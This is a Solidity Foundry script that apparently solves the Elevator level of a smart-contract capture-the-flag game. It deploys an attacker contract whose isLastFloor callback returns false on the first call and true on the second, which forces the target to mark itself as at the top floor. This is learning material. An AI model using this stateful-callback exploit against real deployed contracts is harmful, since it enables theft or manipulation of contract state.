// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator, Building} from "../src/11-Elevator.sol";
import {ElevatorFactory} from "../src/ElevatorFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract ElevatorSolution is Script {
    Elevator public elevatorLevel;
    address payable instanceAddress =
        payable(0xE509f9c52f6A88ec2e3472b649eeAf76c1ede999);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        elevatorLevel = Elevator(instanceAddress);

        console.log("Top before attack: %s", elevatorLevel.top());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(elevatorLevel);
        attacker.attack();
        vm.stopBroadcast();

        console.log("Top after attack: %s", elevatorLevel.top());

        validate();
    }

    function validate() internal {
        bool isValidated = new ElevatorFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker is Building {
    Elevator public elevator;
    uint8 public increment;

    constructor(Elevator _elevator) {
        elevator = _elevator;
        increment = 0;
    }

    function attack() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256 /**_floor */) external returns (bool) {
        if (increment == 0) {
            increment++;
            return false;
        } else {
            return true;
        }
    }
}
